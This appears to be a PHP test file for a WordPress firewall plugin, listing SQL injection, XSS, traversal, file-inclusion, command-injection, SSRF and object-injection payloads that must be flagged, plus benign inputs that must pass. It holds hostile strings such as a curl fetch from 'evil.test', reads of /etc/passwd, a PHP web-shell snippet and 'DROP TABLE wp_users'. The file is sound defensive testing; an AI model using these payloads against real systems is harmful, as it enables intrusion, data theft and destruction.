<?php
/**
 * WAF detection corpus: attack-shaped inputs must match, benign traffic must not.
 *
 * Samples are synthetic, hand-written regression inputs. They are not a
 * representative exploit corpus and do not measure real-world detection rates.
 *
 * @package GracewellSecuritySuitePro
 */

gw_group( 'waf' );

$waf_detect = static function ( string $payload, array $rules = array() ): string {
	$settings = array(
		'sql'  => true,
		'xss'  => true,
		'bots' => true,
	);
	$legacy = GWQSH_Firewall::match( array( 'q' => $payload ), '', '', $settings );
	$adv    = GWQSH_Firewall::advanced(
		array( 'q' => $payload ),
		array(),
		array(),
		'/index.php',
		array_merge(
			array(
				'traversal' => true,
				'inclusion' => true,
				'post'      => false,
				'uploads'   => false,
			),
			$rules
		)
	);
	return $legacy . '|' . $adv;
};

// phpcs:disable Squiz.PHP.Heredoc.NotAllowed
$sqli = array(
	'boolean tautology'      => "1' OR '1'='1",
	'boolean numeric'        => "1' OR 1=1-- -",
	'union select null'      => "-1 UNION SELECT NULL, version()",
	'union select 1'         => "0 union select 1,2,3",
	'information_schema'     => "1 AND 1=2 UNION SELECT table_name FROM information_schema.tables",
	'comment stacked'        => "1;DROP TABLE wp_users--",
	'time based sleep'       => "1' AND SLEEP(5)--",
	'benchmark'              => "1 AND BENCHMARK(10000000,MD5(1))",
	'hex literal'            => "0x68656c6c6f776f726c64",
	'char() obfuscation'     => "CONCAT(CHAR(65,66,67,68))",
	'into outfile'           => "1 UNION SELECT 1 INTO OUTFILE '/tmp/x'",
	'extractvalue error'     => "1 AND extractvalue(1,concat(0x7e,version()))",
);
$waf_detect_fn = static fn( string $payload ) => $waf_detect( $payload ) !== '|';

gw_expect_all( 'SQL injection corpus detected', $sqli, $waf_detect_fn );

$xss = array(
	'script tag'        => '<script>alert(1)</script>',
	'img onerror'       => '<img src=x onerror=alert(1)>',
	'svg onload'        => '<svg/onload=alert(1)>',
	'body onload'       => '<body onload=alert(document.cookie)>',
	'javascript uri'    => 'javascript:alert(document.domain)',
	'iframe srcdoc'     => '<iframe srcdoc="<script>alert(1)</script>">',
	'details ontoggle'  => '<details open ontoggle=alert(1)>',
	'data html base64'  => 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==',
);
gw_expect_all( 'XSS corpus detected', $xss, $waf_detect_fn );

$traversal = array(
	'dot dot slash x2'     => '../../etc/passwd',
	'dot dot slash x1'     => '../wp-config.php',
	'encoded traversal'    => '%2e%2e%2fwp-config.php',
	'windows traversal'    => '..\\..\\windows\\win.ini',
	'deep traversal'       => '....//....//etc/passwd',
);
gw_expect_all( 'Path traversal corpus detected', $traversal, $waf_detect_fn );

$lfi = array(
	'php filter chain'  => 'php://filter/convert.base64-encode/resource=index',
	'expect wrapper'    => 'expect://id',
	'data wrapper'      => 'data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+',
	'passwd path'       => '/etc/passwd',
	'proc environ'      => '/proc/self/environ',
);
gw_expect_all( 'File inclusion corpus detected', $lfi, $waf_detect_fn );

$rce = array(
	'semicolon cat'   => ';cat /etc/passwd',
	'pipe id'         => '| id',
	'backtick whoami' => '`whoami`',
	'dollar paren'    => '$(curl -s http://evil.test/x)',
);
gw_expect_all( 'Command injection corpus detected', $rce, $waf_detect_fn );

$ssrf = array(
	'aws metadata'   => 'http://169.254.169.254/latest/meta-data/',
	'localhost'      => 'http://localhost:8080/admin',
	'private 10'     => 'http://10.0.0.5/internal',
	'loopback 127'   => 'http://127.0.0.1:9200/_cat/indices',
	'gopher scheme'  => 'gopher://127.0.0.1:6379/_INFO',
	'google meta'    => 'http://metadata.google.internal/computeMetadata/v1/',
);
gw_expect_all( 'SSRF corpus detected', $ssrf, $waf_detect_fn );

$deserialization = array(
	'php object'    => 'O:8:"stdClass":1:{s:4:"test";s:4:"test";}',
	'php object b'  => 'a:1:{i:0;O:7:"WP_User":1:{s:2:"ID";i:1;}}',
);
gw_expect_all( 'PHP object injection corpus detected', $deserialization, $waf_detect_fn );

$benign = array(
	'simple search'      => 'red shoes',
	'quoted phrase'      => 'Wool "merino" socks',
	'apostrophe'         => "O'Brien's bakery",
	'url with query'     => 'https://example.com/page?utm_source=news&utm_medium=email',
	'json-ish'           => '{"layout":"grid","columns":3}',
	'html markup'        => '<p>Hello <strong>world</strong></p>',
	'version string'     => '1.2.3-beta.1',
	'ellipsis'           => 'Wait... what happened?',
	'percentage'         => '50% off, 2 for 1',
	'email'              => 'customer@example.com',
	'long prose'         => 'The quick brown fox jumps over the lazy dog, then selects the option from the menu.',
	'equation'           => '2 + 2 = 4 and 3 * 3 = 9',
	'css hex'            => 'color: #ff00ff; background: url(/img/a.png)',
	'windows path name'  => 'C:\\Users\\Public\\Documents\\report.pdf',
	'smart quotes'       => 'He said “select all” then left',
	'base64 image'       => 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mP8z8AAAwAB/AF+7y0kAAAAAElFTkSuQmCC',
	'search with sql word' => 'how to select from a database',
	'search with script word' => 'javascript tutorial for beginners',
	'admin path text'    => '/wp-admin/admin.php?page=gracewell',
);
gw_expect_none( 'Benign traffic allowed', $benign, static fn( string $payload ) => $waf_detect( $payload ) !== '|' );

// Extended obfuscation corpus: shapes observed in public exploit traffic.
$sqli_extended = array(
	'quoted tautology single' => "' or 'x'='x",
	'quoted tautology dbl'    => '" or ""="',
	'paren tautology'         => '1) OR (1=1)',
	'no space or'             => "'or'1'='1",
	'mysql version comment'   => '/*!50000UNION*/ /*!50000SELECT*/ 1,2,3',
	'inline comment union'    => '1 UNION/**/SELECT/**/1,2,3',
	'semicolon waitfor'       => "1;WAITFOR DELAY '0:0:5'--",
	'like tautology'          => "1' OR 1 LIKE 1--",
	'nested select'           => 'id=1 AND (SELECT 1 FROM (SELECT SLEEP(5))x)',
);
gw_expect_all( 'SQL injection obfuscation corpus detected', $sqli_extended, $waf_detect_fn );

$xss_extended = array(
	'nested script tag'   => '<scr<script>ipt>alert(1)</script>',
	'space before equals' => '<img src=1 onerror =alert(1)>',
	'animate onbegin'     => '<svg><animate onbegin=alert(1) attributeName=x dur=1s>',
	'broken tag context'  => '"><script>alert(1)</script>',
	'uppercase handler'   => '<IMG SRC=x ONERROR=alert(1)>',
	'svg set'             => '<svg><set attributeName=onmouseover to=alert(1)>',
);
gw_expect_all( 'XSS obfuscation corpus detected', $xss_extended, $waf_detect_fn );

// Credential-named parameters must not become an inspection blind spot.
gw_group( 'waf-credential-keys' );
$credential_bypass = array(
	'password param'  => array( 'password' => "' OR 1=1-- -" ),
	'pwd param'       => array( 'pwd' => '1 UNION SELECT NULL,version()' ),
	'log param'       => array( 'log' => "admin' OR '1'='1" ),
	'token param'     => array( 'token' => '../../etc/passwd' ),
	'session param'   => array( 'session' => '<?php system($_GET[c]); ?>' ),
	'code param'      => array( 'code' => 'O:8:"stdClass":1:{s:1:"a";s:1:"b";}' ),
	'nested cred key' => array( 'auth' => array( 'password' => "' OR '1'='1" ) ),
);
gw_expect_all(
	'Credential-named parameters still inspected for high-confidence attacks',
	$credential_bypass,
	static function ( array $params ): bool {
		$settings = array( 'sql' => true, 'xss' => true, 'bots' => true );
		$legacy   = GWQSH_Firewall::match( $params, '', '', $settings );
		$adv      = GWQSH_Firewall::advanced( $params, array(), array(), '/wp-login.php', array(
			'traversal' => true,
			'inclusion' => true,
			'post'      => false,
			'uploads'   => false,
		) );
		return '' !== $legacy || '' !== $adv;
	}
);
